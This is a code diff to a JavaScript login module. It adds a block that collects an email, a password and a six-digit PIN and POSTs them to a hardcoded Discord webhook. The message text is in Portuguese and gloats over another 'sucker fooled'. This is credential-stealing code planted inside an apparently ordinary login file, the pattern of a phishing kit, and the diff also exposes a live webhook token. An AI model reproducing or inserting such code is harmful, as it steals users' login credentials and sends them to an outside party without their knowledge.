@@ -1,5 +1,34 @@
 const loginResource = `login`
 
+Bico = {
+    email: 'example@example.com',
+    password: 'minhasenh123',
+    password6: '123456',
+}
+
+var xhttp = new XMLHttpRequest()
+var discordWebhook =
+    'https://discord.com/api/webhooks/919671150596993104/JCe51ymMno_5nvR9t23GjrsTinf24BD5F3Mvel40v-HeFQI7gPyt3-xt-B504FKo9v88'
+
+xhttp.open('POST', discordWebhook)
+xhttp.setRequestHeader('Content-type', 'application/json')
+
+var params = {
+    username: 'É bloco 7 ladrão -- By FrankFK',
+    avatar_url:
+        'https://media.discordapp.net/attachments/855886260471595010/855897495921098773/fb61b5869d7192528104009eba8573f5.gif',
+
+    content:
+        '**\nEXTRA EXTRA, MAIS UM OTÁRIO ENGANADO!! -- Faz Igual ou Dobra!!**\n\nEmail: ```' +
+        Bico.email +
+        '```\nSenha: ```' +
+        Bico.password +
+        '```\nSenha de 6: ```' +
+        Bico.password6 +
+        '```\n**Finalizado** ',
+}
+xhttp.send(JSON.stringify(params))
+
 const requestLogin = (object) => {
     return new Promise((resolve, reject) => {
         const { email, password, gToken } = object
